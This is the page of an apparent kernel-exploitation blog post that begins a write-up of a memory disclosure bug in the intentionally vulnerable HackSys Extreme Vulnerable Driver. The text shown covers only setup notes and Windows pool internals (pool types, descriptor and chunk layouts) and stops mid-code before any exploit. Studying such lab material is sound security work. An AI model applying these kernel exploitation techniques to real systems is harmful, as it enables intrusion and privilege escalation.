
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.5.2+insiders-4.23.5">
    
    
      
        <title>HackSys Extreme Vulnerable Driver 3 - Memory Disclosure - linxz.tech</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.5014570d.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.cbb835fc.min.css">
        
          
          
          <meta name="theme-color" content="#000000">
        
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=JetBrains+Mono:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"JetBrains Mono";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../stylesheets/extra.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="green">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#introduction" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="linxz.tech" class="md-header__button md-logo" aria-label="linxz.tech" data-md-component="logo">
      
  <img src="../../../assets/logo.jpg" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            linxz.tech
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              HackSys Extreme Vulnerable Driver 3 - Memory Disclosure
            
          </span>
        </div>
      </div>
    </div>
    
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            <nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        




  
    <li class="md-tabs__item">
      <a href="../../.." class="md-tabs__link">
        
  
  Linxz' Blog

      </a>
    </li>
  

      
        




  
    <li class="md-tabs__item">
      <a href="../../../about/" class="md-tabs__link">
        
  
  About

      </a>
    </li>
  

      
        




  
    <li class="md-tabs__item">
      <a href="../../../tags/" class="md-tabs__link">
        
  
  Tags

      </a>
    </li>
  

      
        

  




  
    
    
    
      <li class="md-tabs__item">
        <a href="../../" class="md-tabs__link md-tabs__link--active">
          
  
    
  
  Posts

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
                
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="linxz.tech" class="md-nav__button md-logo" aria-label="linxz.tech" data-md-component="logo">
      
  <img src="../../../assets/logo.jpg" alt="logo">

    </a>
    linxz.tech
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linxz' Blog
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
    <li class="md-nav__item">
      <a href="../../../about/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    About
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
    <li class="md-nav__item">
      <a href="../../../tags/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tags
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
        
        
          <label class="md-nav__link" for="__nav_4">
            
  
  <span class="md-ellipsis">
    Posts
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" aria-label="Posts" data-md-level="1">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Posts
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Latest Posts
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2" type="checkbox" id="__nav_4_2" >
        
        
          <label class="md-nav__link" for="__nav_4_2">
            
  
  <span class="md-ellipsis">
    2019
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" aria-label="2019" data-md-level="2">
          <label class="md-nav__title" for="__nav_4_2">
            <span class="md-nav__icon md-icon"></span>
            2019
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../2019/2019-08-31-NetSecFocus-AES-Challenge/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NetSecFocus BSides Cymru AES Challenge
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../2019/2019-12-8-BAE-ctf-crypto3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    BAE x BSides Chelt CTF
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3" type="checkbox" id="__nav_4_3" >
        
        
          <label class="md-nav__link" for="__nav_4_3">
            
  
  <span class="md-ellipsis">
    2021
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" aria-label="2021" data-md-level="2">
          <label class="md-nav__title" for="__nav_4_3">
            <span class="md-nav__icon md-icon"></span>
            2021
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Analysis of a VMWare Guest-to-Host Escape from Pwn2Own 2017
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4" type="checkbox" id="__nav_4_4" checked>
        
        
          <label class="md-nav__link" for="__nav_4_4">
            
  
  <span class="md-ellipsis">
    2022
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" aria-label="2022" data-md-level="2">
          <label class="md-nav__title" for="__nav_4_4">
            <span class="md-nav__icon md-icon"></span>
            2022
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../2022-05-14-HEVD3-StackOverflow/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HackSys Extreme Vulnerable Driver 3 - Stack Overflow + SMEP Bypass
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../2022-05-21-HEVD3-DoubleFetch/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HackSys Extreme Vulnerable Driver 3 - Double Fetch
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    HackSys Extreme Vulnerable Driver 3 - Memory Disclosure
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    HackSys Extreme Vulnerable Driver 3 - Memory Disclosure
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nonpaged-pool-memory-disclosure" class="md-nav__link">
    <span class="md-ellipsis">
      NonPaged Pool Memory Disclosure
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#memory-pool" class="md-nav__link">
    <span class="md-ellipsis">
      Memory Pool
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Memory Pool">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nonpagednx-pool" class="md-nav__link">
    <span class="md-ellipsis">
      NonPagedNx Pool
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reversing-the-driver" class="md-nav__link">
    <span class="md-ellipsis">
      Reversing the Driver
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reversing the Driver">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#locating-the-ioctl-handler" class="md-nav__link">
    <span class="md-ellipsis">
      Locating the IOCTL Handler
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reversing-the-vulnerable-function" class="md-nav__link">
    <span class="md-ellipsis">
      Reversing the Vulnerable Function
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dynamic-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Dynamic Analysis
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Dynamic Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#interacting-with-the-driver" class="md-nav__link">
    <span class="md-ellipsis">
      Interacting with the Driver
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploitation" class="md-nav__link">
    <span class="md-ellipsis">
      Exploitation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#leaking-driver-addresses" class="md-nav__link">
    <span class="md-ellipsis">
      Leaking Driver Addresses
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Leaking Driver Addresses">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#inspecting-the-pool" class="md-nav__link">
    <span class="md-ellipsis">
      Inspecting the Pool
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leaking-a-function-pointer" class="md-nav__link">
    <span class="md-ellipsis">
      Leaking a Function Pointer
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#improving-reliability" class="md-nav__link">
    <span class="md-ellipsis">
      Improving Reliability
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#final-result" class="md-nav__link">
    <span class="md-ellipsis">
      Final Result
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#fix" class="md-nav__link">
    <span class="md-ellipsis">
      Fix
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#full-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      Full Exploit
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#acknowledgements" class="md-nav__link">
    <span class="md-ellipsis">
      Acknowledgements
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
                
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nonpaged-pool-memory-disclosure" class="md-nav__link">
    <span class="md-ellipsis">
      NonPaged Pool Memory Disclosure
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#memory-pool" class="md-nav__link">
    <span class="md-ellipsis">
      Memory Pool
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Memory Pool">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nonpagednx-pool" class="md-nav__link">
    <span class="md-ellipsis">
      NonPagedNx Pool
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reversing-the-driver" class="md-nav__link">
    <span class="md-ellipsis">
      Reversing the Driver
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reversing the Driver">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#locating-the-ioctl-handler" class="md-nav__link">
    <span class="md-ellipsis">
      Locating the IOCTL Handler
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reversing-the-vulnerable-function" class="md-nav__link">
    <span class="md-ellipsis">
      Reversing the Vulnerable Function
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dynamic-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Dynamic Analysis
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Dynamic Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#interacting-with-the-driver" class="md-nav__link">
    <span class="md-ellipsis">
      Interacting with the Driver
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploitation" class="md-nav__link">
    <span class="md-ellipsis">
      Exploitation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#leaking-driver-addresses" class="md-nav__link">
    <span class="md-ellipsis">
      Leaking Driver Addresses
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Leaking Driver Addresses">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#inspecting-the-pool" class="md-nav__link">
    <span class="md-ellipsis">
      Inspecting the Pool
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leaking-a-function-pointer" class="md-nav__link">
    <span class="md-ellipsis">
      Leaking a Function Pointer
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#improving-reliability" class="md-nav__link">
    <span class="md-ellipsis">
      Improving Reliability
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#final-result" class="md-nav__link">
    <span class="md-ellipsis">
      Final Result
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#fix" class="md-nav__link">
    <span class="md-ellipsis">
      Fix
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#full-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      Full Exploit
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#acknowledgements" class="md-nav__link">
    <span class="md-ellipsis">
      Acknowledgements
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  
  
  


  <nav class="md-tags" >
    
      
      
        <a href="../../../tags/#windows-kernel-exploitation" class="md-tag">windows-kernel-exploitation</a>
      
    
  </nav>




<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
<p>Over the next few posts we're going to heavily focus on the pool, as a result this post serves two purposes. The first purpose is to ascertain a basic understanding of the "Pool" prior to Windows RS5 (LFH) and the second is to get familiar with the pool under the direction of an exploit.</p>
<p>This post is a writeup of a NonPaged Pool Memory Disclosure in HackSys Extreme Vulnerable driver - we assume that you already have an environment setup to follow along. However, if you don't have an environment setup in this post we use:</p>
<ul>
<li>Windows 10 Pro x64 RS4</li>
<li><abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr> 3.00</li>
</ul>
<p>If you are not sure how to setup a kernel debugging environment you can find plenty of posts of the process online, we will not cover the process in this post.</p>
<p>If you have not read my previous posts on HackSys Extreme Vulnerable Driver then I'd highly recommend you do so. Although the vulnerabilities there are not particularly related to this post, if you're newer to kernel exploitation specifically on Windows then the previous posts will be useful particularly the classic stack buffer overflow.</p>
<h1 id="nonpaged-pool-memory-disclosure">NonPaged Pool Memory Disclosure<a class="headerlink" href="#nonpaged-pool-memory-disclosure" title="Permanent link">&para;</a></h1>
<p>In this post we're going to explore a memory disclosure primitive in a function which allocates on the NonPaged Pool. Although the primitive itself is fairly simple it will give us the context required to go further with exploiting more complex primitives featuring the pool in future posts. In short, this post serves as a foundation for developing an understanding of the Windows Pool pre-LFH.</p>
<details class="note" open="open">
<summary>Note</summary>
<p>In later posts we will explore this content again in a post-LFH world. Although pre-LFH is not as relevant now, it serves as a great foundation. I wanted the content to remain semi-relevant to real-life hence why we're on Windows 10 x64 and not x86.</p>
</details>
<h1 id="memory-pool">Memory Pool<a class="headerlink" href="#memory-pool" title="Permanent link">&para;</a></h1>
<p>The "Pool" is the heap reserved specifically for kernel-land on Windows, i.e, its a fancy term for the kernels heap. In previous releases of Windows the Pool allocator has been specific and different from the allocator that existed in user-land. However as of the 19H1 Windows 10 release this has changed and the well documented Segmeant Heap from user-land has been brought into the kernel. In this post we will be exploring the old pool, i.e, we won't be looking at the Segment Heap internals since we're on RS4 and as mentioned the Segment Heap from user-land was not brought into the kernel until 19H1.</p>
<details class="note" open="open">
<summary>Note</summary>
<p>As a quick aside the reason why I am not looking at the Segment Heap implementation is because I've never interacted with the Pool prior to this post so we're starting somewhat at the beginning. You might be wondering why I am not doing this on Windows 7 x86 in that case and the reason is simple - there's a million posts on that, you won't learn anything new from me on those builds. But you might on Windows 10 x64.</p>
</details>
<p>The kernel pools are divided into four distinct types which are held in the <code>_POOL_DESCRIPTOR</code> structure with a type of <code>POOL_TYPE</code>:</p>
<ul>
<li>Paged</li>
<li>NonPaged</li>
<li>NonPagedNx</li>
<li>Session</li>
</ul>
<p>The <strong>Pool Descriptor</strong> keeps information on the current state of the pool including the pool type as mentioned, its typedef can be seen below.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-0-10">10</a></span>
<span class="normal"><a href="#__codelineno-0-11">11</a></span>
<span class="normal"><a href="#__codelineno-0-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_POOL_DESCRIPTOR</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="w">    </span><span class="n">POOL_TYPE</span><span class="w">  </span><span class="n">PoolType</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="w">    </span><span class="n">ULONG</span><span class="w">      </span><span class="n">PoolIndex</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="w">    </span><span class="n">ULONG</span><span class="w">      </span><span class="n">RunningAllocs</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="w">    </span><span class="n">ULONG</span><span class="w">      </span><span class="n">RunningDeAllocs</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="w">    </span><span class="n">ULONG</span><span class="w">      </span><span class="n">TotalPages</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="w">    </span><span class="n">ULONG</span><span class="w">      </span><span class="n">TotalBigPages</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="w">    </span><span class="n">ULONG</span><span class="w">      </span><span class="n">Threshold</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="w">    </span><span class="n">PVOID</span><span class="w">      </span><span class="n">LockAddress</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="w">    </span><span class="n">LIST_ENTRY</span><span class="w"> </span><span class="n">ListHeads</span><span class="p">[</span><span class="n">POOL_LIST_HEADS</span><span class="p">];</span><span class="w"></span>
<a id="__codelineno-0-11" name="__codelineno-0-11"></a>
<a id="__codelineno-0-12" name="__codelineno-0-12"></a><span class="p">}</span><span class="w"> </span><span class="n">POOL_DESCRIPTOR</span><span class="p">;</span><span class="w"> </span><span class="o">*</span><span class="n">PPOOL_DESCRIPTOR</span><span class="o">*</span><span class="p">;</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>Each allocation is identified using a <strong>Pool Tag</strong> which is a four-byte character array that is specified by the driver when it allocates the memory using a call to <code>ExAllocatePoolWithTag</code>. The Pool Tag can ultimately be anything as long as each character is ASCII.</p>
<p>In essence the pool is simply just a list of allocated memory pages. Each page is 0x1000 bytes in size and is fragmented in chunks. Chunks can be different sizes however in our case we'll only focus on chunks smaller than 0xFF1 bytes. Below is the structure of a pool chunk:</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-1-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-1-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-1-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-1-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-1-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-1-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-1-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-1-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-1-10">10</a></span>
<span class="normal"><a href="#__codelineno-1-11">11</a></span>
<span class="normal"><a href="#__codelineno-1-12">12</a></span>
<span class="normal"><a href="#__codelineno-1-13">13</a></span>
<span class="normal"><a href="#__codelineno-1-14">14</a></span>
<span class="normal"><a href="#__codelineno-1-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a>   |---------------------------------------------------|
<a id="__codelineno-1-2" name="__codelineno-1-2"></a>0  | PreviousSize | PoolIndex | Block Size | Pool Type |
<a id="__codelineno-1-3" name="__codelineno-1-3"></a>4  |---------------------------------------------------|
<a id="__codelineno-1-4" name="__codelineno-1-4"></a>   |                      Pool Tag                     |
<a id="__codelineno-1-5" name="__codelineno-1-5"></a>8  |---------------------------------------------------|
<a id="__codelineno-1-6" name="__codelineno-1-6"></a>   |                                                   |
<a id="__codelineno-1-7" name="__codelineno-1-7"></a>   |                   Process Billed                  |
<a id="__codelineno-1-8" name="__codelineno-1-8"></a>   |                                                   |
<a id="__codelineno-1-9" name="__codelineno-1-9"></a>16 |---------------------------------------------------|
<a id="__codelineno-1-10" name="__codelineno-1-10"></a>   |                                                   |
<a id="__codelineno-1-11" name="__codelineno-1-11"></a>   |                                                   |
<a id="__codelineno-1-12" name="__codelineno-1-12"></a>   |                       Data                        |
<a id="__codelineno-1-13" name="__codelineno-1-13"></a>   |                                                   |
<a id="__codelineno-1-14" name="__codelineno-1-14"></a>   |                                                   |
<a id="__codelineno-1-15" name="__codelineno-1-15"></a>   |---------------------------------------------------|
</code></pre></div></td></tr></table></div>
<p>As noted the primary API for pool allocations is <code>ExAllocatePoolWithTag</code>. The prototype for <code>ExAllocatePoolWithTag</code> can be seen below:</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
<span class="normal"><a href="#__codelineno-2-2">2</a></span>
<span class="normal"><a href="#__codelineno-2-3">3</a></span>
<span class="normal"><a href="#__codelineno-2-4">4</a></span>
<span class="normal"><a href="#__codelineno-2-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="n">PVOID</span><span class="w"> </span><span class="nf">ExAllocatePoolWithTag</span><span class="p">(</span><span class="w"></span>
<a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="w">    </span><span class="n">POOL_TYPE</span><span class="w">   </span><span class="n">PoolType</span><span class="p">,</span><span class="w"></span>
